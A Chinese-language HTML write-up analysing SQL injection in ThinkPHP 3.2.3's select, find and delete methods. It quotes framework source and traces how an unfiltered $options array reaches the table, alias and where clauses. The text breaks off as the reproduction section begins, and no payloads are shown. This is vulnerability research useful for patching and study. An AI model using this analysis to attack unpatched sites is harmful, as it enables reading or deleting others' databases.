<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs508254C{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;text-decoration: none;}
			.cs4B51D5E4{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="thinkphp-323-selectfinddelete-注入漏洞"><span class="csDE05BCC">Thinkphp 3.2.3 select&amp;find&amp;delete </span><span class="csECDA2D3">注入漏洞</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一、漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<h2 class="cs868C439D">
			<a name="二、漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">&lt;= 3.2.3</span></p><h2 class="cs868C439D">
			<a name="三、复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="漏洞分析"><span class="csD6CA00D2">漏洞分析</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">通过</span><span class="cs8926E06">github</span><span class="cs9C1B1871">上的</span><span class="cs8926E06">commit </span><span class="cs9C1B1871">对比其实可以粗略知道，此次更新主要是在</span><span class="cs9FB05234">ThinkPHP/Library/Think/Model.class.php</span><span class="cs9C1B1871">文件中，其中对于</span><span class="cs9FB05234">delete</span><span class="cs9C1B1871">，</span><span class="cs9FB05234">find</span><span class="cs9C1B1871">，</span><span class="cs9FB05234">select</span><span class="cs9C1B1871">三个函数进行了修改。</span></p><p class="cs40DD2BC9"><span class="cs9FB05234">delete</span><span class="cs9C1B1871">函数</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Thinkphp/Thinkphp_3.x_漏洞/Thinkphp%203.2.3%20select&find&delete%20%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e_files/image0.png" width="560" height="353" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9FB05234">select</span><span class="cs9C1B1871">函数</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Thinkphp/Thinkphp_3.x_漏洞/Thinkphp%203.2.3%20select&find&delete%20%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e_files/image1.png" width="560" height="447" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9FB05234">find</span><span class="cs9C1B1871">函数</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Thinkphp/Thinkphp_3.x_漏洞/Thinkphp%203.2.3%20select&find&delete%20%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e_files/image2.png" width="560" height="438" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">对比三个方法修改的地方都有一个共同点：</span></p><p class="cs6FD73CFB"><span class="cs9C1B1871">把外部传进来的</span><span class="cs9FB05234">$options</span><span class="cs9C1B1871">，修改为</span><span class="cs9FB05234">$this-&gt;options</span><span class="cs9C1B1871">，同时不再使用</span><span class="cs9FB05234">$this-&gt;_parseOptions</span><span class="cs9C1B1871">对于</span><span class="cs9FB05234">$options</span><span class="cs9C1B1871">进行表达式分析。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">思考是因为</span><span class="cs9FB05234">$options</span><span class="cs9C1B1871">可控，再经过</span><span class="cs9FB05234">_parseOptions</span><span class="cs9C1B1871">函数之后产生了</span><span class="cs8926E06">sql</span><span class="cs9C1B1871">注入。</span></p><h3 class="cs868C439D">
			<a name="一-select-和-find-函数"><span class="csD6CA00D2">一</span><span class="csD1E291E2"> select </span><span class="csD6CA00D2">和</span><span class="csD1E291E2"> find </span><span class="csD6CA00D2">函数</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">以</span><span class="cs9FB05234">find</span><span class="cs9C1B1871">函数为例进行分析（</span><span class="cs9FB05234">select</span><span class="cs9C1B1871">代码类似），该函数可接受一个</span><span class="cs9FB05234">$options</span><span class="cs9C1B1871">参数，作为查询数据的条件。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">当</span><span class="cs9FB05234">$options</span><span class="cs9C1B1871">为数字或者字符串类型的时候，直接指定当前查询表的主键作为查询字段：</span></p><p class="cs3A447A38"><span class="cs9FB05234">if (is_numeric($options) || is_string($options)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$where[$this-&gt;getPk()] = $options;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$options &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;= array();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$options[&#39;where&#39;] &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;= $where;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">同时提供了对复合主键的查询，看到判断：</span></p><p class="cs3A447A38"><span class="cs9FB05234">if (is_array($options) &amp;&amp; (count($options) &gt; 0) &amp;&amp; is_array($pk)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">根据复合主键查询</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;......</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">要进入复合主键查询代码，需要满足</span><span class="cs9FB05234">$options</span><span class="cs9C1B1871">为数组同时</span><span class="cs9FB05234">$pk</span><span class="cs9C1B1871">主键也要为数组，但这个对于表只设置一个主键的时候不成立。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">那么就可以使</span><span class="cs9FB05234">$options</span><span class="cs9C1B1871">为数组，同时找到一个表只有一个主键，就可以绕过两次判断，直接进入</span><span class="cs9FB05234">_parseOptions</span><span class="cs9C1B1871">进行解析。</span></p><p class="cs3A447A38"><span class="cs9FB05234">if (is_numeric($options) || is_string($options)) {//$options</span><span class="cs7FFD2630">为数组不进入</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$where[$this-&gt;getPk()] = $options;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$options &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;= array();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$options[&#39;where&#39;] &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;= $where;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">根据复合主键查找记录</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$pk = $this-&gt;getPk();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (is_array($options) &amp;&amp; (count($options) &gt; 0) &amp;&amp; is_array($pk)) { //$pk</span><span class="cs7FFD2630">不为数组不进入</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;......</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">总是查找一条记录</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$options[&#39;limit&#39;] = 1;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">分析表达式</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$options = $this-&gt;_parseOptions($options); //</span><span class="cs7FFD2630">解析表达式</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">判断查询缓存</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.....</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$resultSet = $this-&gt;db-&gt;select($options); //</span><span class="cs7FFD2630">底层执行</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">之后跟进</span><span class="cs9FB05234">_parseOptions</span><span class="cs9C1B1871">方法，（分析见代码注释）</span></p><p class="cs3A447A38"><span class="cs9FB05234">if (is_array($options)) { //</span><span class="cs7FFD2630">当</span><span class="cs9FB05234">$options</span><span class="cs7FFD2630">为数组的时候与</span><span class="cs9FB05234">$this-&gt;options</span><span class="cs7FFD2630">数组进行整合</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$options = array_merge($this-&gt;options, $options);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (!isset($options[&#39;table&#39;])) {//</span><span class="cs7FFD2630">判断是否设置了</span><span class="cs9FB05234">table </span><span class="cs7FFD2630">没设置进这里</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">自动获取表名</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$options[&#39;table&#39;] = $this-&gt;getTableName();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$fields &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;= $this-&gt;fields;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">指定数据表</span><span class="cs9FB05234"> </span><span class="cs7FFD2630">则重新获取字段列表</span><span class="cs9FB05234"> </span><span class="cs7FFD2630">但不支持类型检测</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$fields = $this-&gt;getDbFields(); //</span><span class="cs7FFD2630">设置了进这里</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">数据表别名</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (!empty($options[&#39;alias&#39;])) {//</span><span class="cs7FFD2630">判断是否设置了数据表别名</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$options[&#39;table&#39;] .= &#39; &#39; . $options[&#39;alias&#39;]; //</span><span class="cs7FFD2630">注意这里，直接拼接了</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">记录操作的模型名称</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$options[&#39;model&#39;] = $this-&gt;name;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">字段类型验证</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (isset($options[&#39;where&#39;]) &amp;&amp; is_array($options[&#39;where&#39;]) &amp;&amp; !empty($fields) &amp;&amp; !isset($options[&#39;join&#39;])) { //</span><span class="cs7FFD2630">让</span><span class="cs9FB05234">$optison[&#39;where&#39;]</span><span class="cs7FFD2630">不为数组或没有设置不进这里</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">对数组查询条件进行字段类型检查</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;......</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">查询过后清空</span><span class="cs9FB05234">sql</span><span class="cs7FFD2630">表达式组装</span><span class="cs9FB05234"> </span><span class="cs7FFD2630">避免影响下次查询</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;options = array();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">表达式过滤</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;_options_filter($options);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return $options;</span></p><p class="cs40DD2BC9"><span class="cs9FB05234">$options</span><span class="cs9C1B1871">我们可控，那么就可以控制为数组类型，传入</span><span class="cs9FB05234">$options[&#39;table&#39;]</span><span class="cs9C1B1871">或</span><span class="cs9FB05234">$options[&#39;alias&#39;]</span><span class="cs9C1B1871">等等，只要提层不进行过滤都是可行的。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">同时我们可以不设置</span><span class="cs9FB05234">$options[&#39;where&#39;]</span><span class="cs9C1B1871">或者设置</span><span class="cs9FB05234">$options[&#39;where&#39;]</span><span class="cs9C1B1871">的值为字符串，可绕过字段类型的验证。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">可以看到在整个对</span><span class="cs9FB05234">$options</span><span class="cs9C1B1871">的解析中没有过滤，直接返回，跟进到底层</span><span class="cs9FB05234">ThinkPHP\Libray\Think\Db\Diver.class.php</span><span class="cs9C1B1871">，找到</span><span class="cs9FB05234">select</span><span class="cs9C1B1871">方法，继续跟进最后来到</span><span class="cs9FB05234">parseSql</span><span class="cs9C1B1871">方法，对</span><span class="cs9FB05234">$options</span><span class="cs9C1B1871">的值进行替换，解析。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">因为</span><span class="cs9FB05234">$options[&#39;table&#39;]</span><span class="cs9C1B1871">或</span><span class="cs9FB05234">$options[&#39;alias&#39;]</span><span class="cs9C1B1871">都是由</span><span class="cs9FB05234">parseTable</span><span class="cs9C1B1871">函数进行解析，跟进：</span></p><p class="cs3A447A38"><span class="cs9FB05234">if (is_array($tables)) {//</span><span class="cs7FFD2630">为数组进</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">支持别名定义</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;......</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} elseif (is_string($tables)) {//</span><span class="cs7FFD2630">不为数组进</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$tables = array_map(array($this, &#39;parseKey&#39;), explode(&#39;,&#39;, $tables));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return implode(&#39;,&#39;, $tables);</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">当我们传入的值不为数组，直接进行解析返回带进查询，没有任何过滤。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">同时</span><span class="cs9FB05234">$options[&#39;where&#39;]</span><span class="cs9C1B1871">也一样，看到</span><span class="cs9FB05234">parseWhere</span><span class="cs9C1B1871">函数</span></p><p class="cs3A447A38"><span class="cs9FB05234">$whereStr = &#39;&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (is_string($where)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">直接使用字符串条件</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$whereStr = $where; //</span><span class="cs7FFD2630">直接返回了，没有任何过滤</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">使用数组表达式</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;......</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return empty($whereStr) ? &#39;&#39; : &#39; WHERE &#39; . $whereStr;</span></p><h3 class="cs868C439D">
			<a name="二-delete函数"><span class="csD6CA00D2">二</span><span class="csD1E291E2"> delete</span><span class="csD6CA00D2">函数</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9FB05234">delete</span><span class="cs9C1B1871">函数有些不同，主要是在解析完</span><span class="cs9FB05234">$options</span><span class="cs9C1B1871">之后，还对</span><span class="cs9FB05234">$options[&#39;where&#39;]</span><span class="cs9C1B1871">判断了一下是否为空，需要我们传一下值，使之不为空</span><span class="cs8926E06">,</span><span class="cs9C1B1871">从而继续执行删除操作。</span></p><p class="cs3A447A38"><span class="cs9FB05234">......</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">分析表达式</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$options = $this-&gt;_parseOptions($options);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (empty($options[&#39;where&#39;])) { //</span><span class="cs7FFD2630">注意这里，还判断了一下</span><span class="cs9FB05234">$options[&#39;where&#39;]</span><span class="cs7FFD2630">是否为空，为空直接返回，不再执行下面的代码。</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">如果条件为空</span><span class="cs9FB05234"> </span><span class="cs7FFD2630">不进行删除操作</span><span class="cs9FB05234"> </span><span class="cs7FFD2630">除非设置</span><span class="cs9FB05234"> 1=1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return false;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (is_array($options[&#39;where&#39;]) &amp;&amp; isset($options[&#39;where&#39;][$pk])) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$pkValue = $options[&#39;where&#39;][$pk];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (false === $this-&gt;_before_delete($options)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return false;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$result = $this-&gt;db-&gt;delete($options);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (false !== $result &amp;&amp; is_numeric($result)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$data = array();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (isset($pkValue)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$data[$pk] = $pkValue;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;_after_delete($data, $options);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">返回删除记录个数</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return $result;</span></p><h3 class="cs868C439D">
			<a name="漏洞复现"><span class="csD6CA00D2">漏洞复现</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">针对</span><span class="cs9FB05234">select()</span><span class="cs8926E06"> </span><span class="cs9C1B1871">和</span><span class="cs9FB05234">find()</span><span class="cs9C1B1871">方法</span><span class="cs8926E06"> ,</span><span class="cs9C1B1871">有很多地方可注，这里主要列举三个</span><span class="cs9FB05234">table</span><span class="cs9C1B1871">，</span><span class="cs9FB05234">alias</span><span class="cs9C1B1871">，</span><span class="cs9FB05234">where</span><span class="cs9C1B1871">，更多还请自行跟踪一下</span><span class="cs9FB05234">parseSql</span><span class="cs9C1B1871">的各个</span><span class="cs9FB05234">parseXXX</span><span class="cs9C1B1871">方法，目测都是可行的，比如</span><span class="cs9FB05234">having</span><span class="cs8926E06">,</span><span class="cs9FB05234">group</span><span class="cs9C1B1871">等。</span></p><p class="cs3A447A38"><span class="cs9FB05234">table</span><span 